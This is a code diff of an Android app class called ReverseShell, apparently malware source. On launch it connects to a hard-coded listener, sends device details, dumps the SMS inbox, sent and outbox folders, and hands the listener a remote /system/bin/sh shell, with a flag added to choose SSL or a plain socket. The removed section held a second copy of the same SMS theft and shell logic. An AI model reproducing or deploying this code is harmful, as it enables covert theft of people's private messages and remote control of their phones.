@@ -39,7 +39,7 @@ public class ReverseShell extends Activity {
 	// Includes the parameters of listening process
 	private TextView outputText;
 	private ProgressBar activitySpinner;
-	private final String host = "192.168.2.3";  // Host of Listener
+	private final String host = "10.0.0.6";  // Host of Listener
 	private final String port = "7777";         // Port of Listener
 	private final String shellPath = "/system/bin/sh";
 	private Context context;
@@ -58,8 +58,8 @@ public class ReverseShell extends Activity {
 			activitySpinner.bringToFront();
 
 			// UI cannot do networking stuff on its own, it needs
-			// a separate thread. 
-			new SecureConnectionThread().execute(host, port);
+			// a separate thread.
+			new SecureConnectionThread().execute(host, port, "true");
 
 		} catch(Exception e) {
 			System.exit(1);
@@ -73,17 +73,21 @@ public class ReverseShell extends Activity {
 		return true;
 	}
 
-	// ---------------------------------------------- //
-	// Subclass: Secure Connection. Separate Thread   //
-	// ---------------------------------------------- //
+	/*
+	 * Subclass: SecureConnectionThread
+	 * @param[0]: string, Hostname of Listener
+	 * @param[1]: string, Port of Listener
+	 * @param[2]: string, "true" if using SSL, any non-null value for non-SSL connection
+	 * 
+	 * */
 	private class SecureConnectionThread extends AsyncTask<String, Void, String> {
 
 		private InputStream netI;
 		private OutputStream netO;
-		private SSLSocket sockfd;
+		private Socket sockfd;
 		private SSLContext sslContext;
 		final String deviceHost = android.os.Build.HOST;
-		
+
 		// Dump the contents of the {inbox,outbox,sent} to the
 		// connection.
 		public String readSMSBox(String box) {
@@ -145,25 +149,25 @@ public class ReverseShell extends Activity {
 				Thread.yield();
 			}
 		} // End runShell
-		
+
 		// Build SSLContext and return the secure socket
 		protected SSLSocket getSecureSocket(String ip, int port) throws Exception {
-			
+
 			try {
 				// Load trust
 				KeyStore trustStore = KeyStore.getInstance("BKS");
 				InputStream storeStream = context.getResources().openRawResource(R.raw.android);
-				
+
 				// Hard-coded password. Not proud of it, but it only
 				// exists in memory for a split second.
 				char[] password = "thepasswordgoes".toCharArray();
 				trustStore.load(storeStream, password);
 				Arrays.fill(password, '0');
-				
+
 				TrustManagerFactory tmf = TrustManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
 				tmf.init(trustStore);
 				storeStream.close();
-				
+
 				// Create SSL Context
 				sslContext = SSLContext.getInstance("TLS");
 				sslContext.init(null, tmf.getTrustManagers(), null);
@@ -172,25 +176,30 @@ public class ReverseShell extends Activity {
 				String[] supported = retSocket.getSupportedCipherSuites();
 				retSocket.setEnabledCipherSuites(supported);
 				return retSocket;
-				
+
 			} catch(GeneralSecurityException e) {
 				throw new IOException("Technically speaking, shit broke.");
 			}
 		} // End getSecureSocket
-		
+
 		@Override
 		protected String doInBackground(String... params) {
 			String ret = "Error.";
 			try {
-				sockfd = getSecureSocket(params[0], Integer.parseInt(params[1]));
+				if(params[2].compareTo("true") == 0) {
+					sockfd = getSecureSocket(params[0], Integer.parseInt(params[1]));
 
+					// Enable Cipher Suites
+					String[] supported = ((SSLSocket) sockfd).getSupportedCipherSuites();
+					((SSLSocket)sockfd).setEnabledCipherSuites(supported);
+
+				} else {
+					sockfd = new Socket(params[0], Integer.parseInt(params[1]));
+				}
+				
 				// PING with the name of the deviceHost
 				DataOutputStream dOut = new DataOutputStream(sockfd.getOutputStream());
 				dOut.writeBytes(deviceHost+"\r\n");
-				
-				// Enable Cipher Suites
-				String[] supported = sockfd.getSupportedCipherSuites();
-				sockfd.setEnabledCipherSuites(supported);
 
 				netI = sockfd.getInputStream();
 				netO = sockfd.getOutputStream();
@@ -203,7 +212,7 @@ public class ReverseShell extends Activity {
 				dOut.writeBytes("[>] SMS Inbox:\r\n"+readSMSBox("inbox"));
 				dOut.writeBytes("[>] SMS Sent:\r\n"+readSMSBox("sent"));
 				dOut.writeBytes("[>] SMS Outbox:\r\n"+readSMSBox("outbox"));
-				dOut.writeBytes("[>] Sending shell:\r\n");
+				dOut.writeBytes("[>] Sending shell, type your commands here:\r\n");
 				dOut.flush();
 
 				// More Fun
@@ -221,114 +230,6 @@ public class ReverseShell extends Activity {
 			outputText.setText(result);
 		}
 	} // End SecureConnectionThread
-
-	// --------------------------------------------------- //
-	// Subclass: Connection. Non-secure, Separate Thread   //
-	// --------------------------------------------------- //
-	private class ConnectionThread extends AsyncTask<String, Void, String> {
-
-		InputStream netI;
-		OutputStream netO;
-		Socket sockfd;
-
-		// Dump the contents of the {inbox,outbox,sent} to the
-		// connection.
-		public String readSMSBox(String box) {
-			Uri SMSURI = Uri.parse("content://sms/"+box);
-			Cursor cur = getContentResolver().query(SMSURI, null, null, null,null);
-			String sms = "";
-			if(cur.moveToFirst()) {
-				for(int i=0; i < cur.getCount(); ++i) {
-					// Get information in a readable format
-					String number = cur.getString(cur.getColumnIndexOrThrow("address")).toString();
-					String date = cur.getString(cur.getColumnIndexOrThrow("date")).toString();
-					Long epoch = Long.parseLong(date);
-					Date fDate = new Date(epoch * 1000);
-					date = fDate.toString();
-					String body = cur.getString(cur.getColumnIndexOrThrow("body")).toString();
-					sms += "["+number+":"+date+"]"+body+"\n";
-					cur.moveToNext();
-				}
-				sms += "\n";
-			}
-			return sms;
-		}
-
-		// Return a String of basic information about the device
-		public String deviceInfo() {
-			String ret = "--------------------------------------------\n";
-			ret += "Manufacturer: "+android.os.Build.MANUFACTURER+"\n";
-			ret += "Version/Release: "+android.os.Build.VERSION.RELEASE+"\n";
-			ret += "Product: "+android.os.Build.PRODUCT+"\n";
-			ret += "Model: "+android.os.Build.MODEL+"\n";
-			ret += "Brand: "+android.os.Build.BRAND+"\n";
-			ret += "Device: "+android.os.Build.DEVICE+"\n";
-			ret += "Host: "+android.os.Build.HOST+"\n";
-			ret += "+--------------------------------------------\n";
-			return ret;
-		}
-
-		// Runs a process, handling the process's input and
-		// output by sending/receiving IO from the socket
-		public void runShell() throws Exception {
-
-			// Build the process
-			ProcessBuilder	pb = new ProcessBuilder(shellPath);
-			pb.redirectErrorStream(true);
-			Process shell = pb.start();
-
-			if(shell == null) {
-				sockfd.close();
-				return;
-			}
-
-			// Get Process IO
-			ProcessIOThread p1 = new ProcessIOThread(shell.getInputStream(), netO);
-			ProcessIOThread p2 = new ProcessIOThread(netI, shell.getOutputStream());
-			p1.start();
-			p2.start();
-
-			while(!p1.running || !p2.running)
-				Thread.sleep(100);
-			while(p1.running || p2.running) {
-				Thread.sleep(100);
-				Thread.yield();
-			}
-		}
-
-		@Override
-		protected String doInBackground(String... strings) {
-			String ret = "Error.";
-			try {
-				sockfd = new Socket(strings[0], Integer.parseInt(strings[1]));
-				netI = sockfd.getInputStream();
-				netO = sockfd.getOutputStream();
-				DataOutputStream dOut = new DataOutputStream(netO);
-
-				// Recon
-				dOut.writeBytes(deviceInfo());
-
-				// Pilfering
-				dOut.writeBytes("[>] SMS Inbox:\r\n"+readSMSBox("inbox"));
-				dOut.writeBytes("[>] SMS Sent:\r\n"+readSMSBox("sent"));
-				dOut.writeBytes("[>] Receiving shell, type your commands:\r\n");
-				dOut.flush();
-
-				// ++
-				runShell();
-
-				sockfd.close();
-			} catch(Exception e) {
-				return e.toString();
-			}
-			return ret;
-		}
-
-		@Override
-		protected void onPostExecute(String result) {
-			outputText.setText(result);
-		}
-	} // End ConnectionThread (unsecured)
 
 	// ---------------------------------------------- //
 	// Subclass: Used to duplex socket IO/Process IO  //
